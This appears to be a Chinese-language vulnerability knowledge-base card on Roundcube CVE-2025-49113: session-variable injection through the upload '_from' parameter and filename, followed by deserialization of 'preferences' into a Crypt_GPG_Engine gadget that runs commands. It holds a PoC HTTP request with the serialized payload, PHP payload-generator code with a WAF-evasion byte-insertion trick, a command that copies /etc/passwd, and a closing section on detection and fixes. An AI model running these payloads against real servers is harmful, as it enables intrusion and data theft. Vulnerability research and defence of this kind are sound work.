---
id: web-php-deser-roundcube-49113-session-injection-gpg-rce
title: Roundcube CVE-2025-49113：上传参数污染 Session 自定义序列化，触发 preferences 二次反序列化 RCE
type: scenario
domain: web
path: web/php/deserialization
technique: roundcube-session-custom-serializer-object-injection
tags:
- php
- deserialization
- object-injection
- roundcube
- session
- cve-2025-49113
- gadget
- rce
cve:
- CVE-2025-49113
severity: high
confidence: high
status: verified
affected_versions: Roundcube <= 1.6.10（原文利用脚本横幅标注；复现代码使用 1.5.9）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V21
  verified_at: '2026-11-05T02:35:54+08:00'
  notes: 已对照原文并逐张核对23张图：图01/02修复点get_input_string+is_simple_string、图03-12自定义unserialize与!错位、图16/17 preferences sink与remove、图18 Crypt_GPG_Engine _closeIdleAgents proc_open、图15/19/20/21 session注入与identity置空、图22脚本执行成功、图23 /tmp/pwned落地，均与卡一致，端到端RCE成立。核对时修正WAF混淆描述：脚本是每字符后插入0xC0-0xC9高位字节，非十六进制转义。未验证点：未本机复跑；_closeIdleAgents由__destruct调用的细节原文未给调用链；frontmatter无sources/source_url。
url: /docs/web/php/deserialization/web-php-deser-roundcube-49113-session-injection-gpg-rce/
draft: false
kb_aliases:
- CVE-2025-49113
- Roundcube 认证后 RCE
- Roundcube session 注入
- rcube_session unserialize
- Crypt_GPG_Engine gadget
- _from 参数注入
- preferences 反序列化
---

## 一句话结论

Roundcube 的身份签名图片上传接口把 GET 参数 `_from` 与上传文件名拼进 `$_SESSION` 的键值路径，而 `rcube_session::unserialize()` 用 `|` 作为键值分隔符、不尊重字符串边界；在 `_from`/文件名中注入 `|` 与序列化片段，即可向会话写入伪造的 `preferences` 和 `preferences_time=0`；随后 `rcube_user::get_prefs()` 对 `$_SESSION['preferences']` 执行原生 `unserialize()`，用 `Crypt_GPG_Engine` gadget 的析构方法拼接 `_gpgconf` 到 `proc_open`，实现认证后命令执行。

## 原理

- **入口参数**：`program/actions/settings/upload.php` 从 GET 取 `_from`，`$type = preg_replace('/(add|edit)-/', '', $from)` 后再把 `.` 替换为 `-`；`$type` 被用于 `$rcmail->config->get($type . '_image_size')` 和 `$rcmail->session->append($type . '.files', $id, $attachment)`。正常值 `edit-identity` 得到 `identity`，但 `_from` 完全由客户端控制。
- **会话写入**：`rcube_session::append($path, $key, $value)` 把值写入 `$_SESSION` 的嵌套路径（如 `identity.files.<id>`），最后统一序列化到 session 存储（文件或数据库 `session` 表的 `vars` 列）。上传附件的 `name` 字段就是客户端文件名，也会进入这个数组。
- **自定义序列化的缺陷**：`rcube_session::unserialize()` 不是 PHP 原生 `unserialize()`，而是把自定义的 `key|value;` 文本重新拼成 `a:N:{...}` 后交给原生 `unserialize()`。它用 `while ($str[$q] != '|')` 找分隔符，遇到 `|` 就切分，不识别“这个 `|` 其实在字符串值里面”。因此文件名或 `_from` 里的 `|` 会被当成新的键值对边界，后续内容被拼进 session 数组，等于**会话变量注入**。
- **`!` 的语义**：解析器遇到键前的 `!` 会把 `$has_value=false`，直接写入 `N;` 并让指针跳过两个字符。攻击者用它把一个键置空，并让后面的 `1;` 等字节错位进入相邻键名，制造字符串/计数错位；同时 `!` 还用于让注入的对象在触发后被 session 的 `remove` 清掉，避免持久化与重复执行。
- **二次反序列化 sink**：`program/lib/Roundcube/rcube_user.php` 的 `get_prefs()` 在 `empty($_SESSION['preferences'])` 为假且 `$_SESSION['preferences_time'] < time() - 5*60` 时执行 `$saved_prefs = unserialize($_SESSION['preferences'])`，随后 `session->remove('preferences')` 与 `remove('preferences_time')`。把 `preferences_time` 注入为 `0` 必然满足条件；反序列化触发的对象在析构时执行命令，而 `remove` 让该键只生效一次，这也是漏洞较隐蔽的原因。
- **gadget**：`vendor/pear/crypt_gpg/Crypt/GPG/Engine.php` 的 `Crypt_GPG_Engine` 私有属性 `$_gpgconf` 在 `__destruct` 路径的 `_closeIdleAgents()` 中被拼接：`$cmd = $this->_gpgconf . ' --kill gpg-agent'; proc_open($cmd, ...)`。把 `$_gpgconf` 设为 `touch /tmp/pwned;#`，`#` 注释掉后面的 `--kill gpg-agent`，即可执行任意 shell 命令。私有属性在序列化串中用空字节名前缀表示（`\00Crypt_GPG_Engine\00_gpgconf`），需要 `S:` 形式或 PHPGGC 的 `process_serialized` 处理空字节。
- **WAF 绕过**：原文在构造 `_from` 时用 `preg_replace('/(.)/', '$1'.hex2bin('c'.rand(0,9)), ...)` 在每个字符后插入一个随机的高位字节（0xC0-0xC9），让空字节/引号等特征不以明文出现；服务端反序列化时会忽略/还原这些字节。

## 触发条件

- Roundcube <= 1.6.10（原文脚本横幅；复现版本 1.5.9），且 `vendor/pear/crypt_gpg` 存在（默认依赖）。
- 攻击者拥有任意可登录的邮箱账号（认证后漏洞）。
- 身份设置中允许上传签名图片（`_task=settings&_action=identities` 的上传接口可达）。
- `_from` 与上传文件名可由客户端控制，且未被 `is_simple_string` 等修复拦截。
- Session 存储可写（文件或数据库），并且 `rcube_user::get_prefs()` 会在后续请求中执行（通常登录后加载用户偏好即触发）。
- 存在可绕过的 WAF/输入过滤（空字节与引号需要编码）。

## 利用步骤

1. 以普通账号登录 Roundcube，获取 `csrftoken`、`roundcube_sessid`、`roundcube_sessauth`。
2. 构造恶意 `_from`：以 `edit-` 开头，后接 `!";i:0;O:16:"Crypt_GPG_Engine":...` 等注入片段；构造恶意文件名：`x|b:0;preferences_time|b:0;preferences|s:<len>:"<序列化数组>"`。
3. 向 `/?_task=settings&_framed=1&_remote=1&_from=<payload>&_id=1&_uploadid=1&_unlock=1&_action=upload` 发送 multipart 上传（字段 `_file[]`，内容任意图片字节）。
4. 服务端把 `_from`/文件名写入 session；自定义序列化被 `|` 打断，`preferences_time=0` 与 `preferences=<恶意序列化串>` 被注入会话。
5. 触发一次会加载用户偏好的请求（登录后的设置页/邮件页），`get_prefs()` 执行 `unserialize($_SESSION['preferences'])`；`Crypt_GPG_Engine` 析构 → `_closeIdleAgents()` → `proc_open` 执行命令。
6. 验证回连/落地文件（如 `/tmp/pwned`）；由于 `session->remove` 会删除 `preferences`，同一 payload 只执行一次。

## PoC

```http
POST /?_from=edit-!";i:0;O:16:"Crypt_GPG_Engine":1:{S:26:"\00Crypt_GPG_Engine\00_gpgconf";S:18:"touch+/tmp/pwned;#";}i:0;b:0;}";}}&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload HTTP/1.1
Host: roundcube.local
X-Requested-With: XMLHttpRequest
Cookie: csrftoken=<token>; roundcube_sessid=<sessid>; roundcube_sessauth=<sessauth>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="_file[]"; filename="x|b:0;preferences_time|b:0;preferences|s:179:\"a:3:{i:0;s:57:\".png"
Content-Type: image/png

IMAGE
------WebKitFormBoundary--
```

```php
// 原文利用脚本中的 payload 生成核心逻辑（Crypt_GPG_Engine gadget）
function calcPayload($cmd){
    class Crypt_GPG_Engine{
        private $_gpgconf;
        function __construct($cmd){ $this->_gpgconf = $cmd.';#'; }
    }
    $payload = serialize(new Crypt_GPG_Engine($cmd));
    $payload = process_serialized($payload) . 'i:0;b:0;'; // PHPGGC：处理私有属性空字节
    $append = strlen(12 + strlen($payload)) - 2;
    $_from = '!";i:0;'.$payload.'}";}}';
    $_file = 'x|b:0;preferences_time|b:0;preferences|s:'.(78 + strlen($payload) + $append).':\\"a:3:{i:0;s:'.(56 + $append).':\\".png';
    $_from = preg_replace('/(.)/', '$1'.hex2bin('c'.rand(0,9)), $_from); // WAF 混淆
    return [$_from, $_file];
}
```

```text
# 执行：php CVE-2025-49113.php http://127.0.0.1:9876/ roundcube <password> "cat /etc/passwd > /tmp/pwned"
# 预期：/tmp/pwned 出现，且 session 中的 preferences 被 remove
```

## 变体与关联

- 变体：用 `identity` 以外的 `$type`（其他 `add-/edit-` 表单）改变 session 路径；只要 `append` 的键或值可控即可注入。
- 变体：session 存储从文件改为数据库时，注入点相同，只是序列化串落在 `session.vars` 的 Base64 中；可用 SQL 读取验证。
- 变体：gadget 换成其他带 `__destruct`/`__wakeup` 的类；`Crypt_GPG_Engine` 只是默认依赖中最直接的一个。
- 关联：[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（PHP 魔术方法链）、[[web-php-deserialization-reflection-private-property-payload]]（私有属性 payload 构造）、[[web-php-deserialization-pop-filelogger-webshell]]。
- 边界：Roundcube 已升级到修复版本；`is_simple_string($type)` 拒绝 `|`/引号/空字节；未安装 Crypt_GPG；session 不可写或 `preferences` 已被其他逻辑清理；WAF 能识别高位字节混淆时失效。

## 检测与防御

- 检测：`_from` 中出现 `|`、`";`、`O:`、`Crypt_GPG_Engine`、`\00`/`%00` 或密集插入的高位字节（0xC0-0xC9）；上传文件名包含 `|` 与 `preferences`；session 数据中出现用户提交的序列化对象；`proc_open` 子进程出现 `--kill gpg-agent` 或 `;#`；`/tmp` 下异常落地文件。
- 修复：升级到 Roundcube 1.6.11 / 1.5.11 或更高；在 `upload.php` 对 `$type`/`_from` 做 `is_simple_string` 白名单校验。
- 加固：不要用自定义的 `key|value` 会话序列化器；迁移到 PHP 原生 session 序列化并校验键名；禁用不需要的 `Crypt_GPG` 组件；WAF 拦截空字节/序列化特征；限制上传文件名字符集。
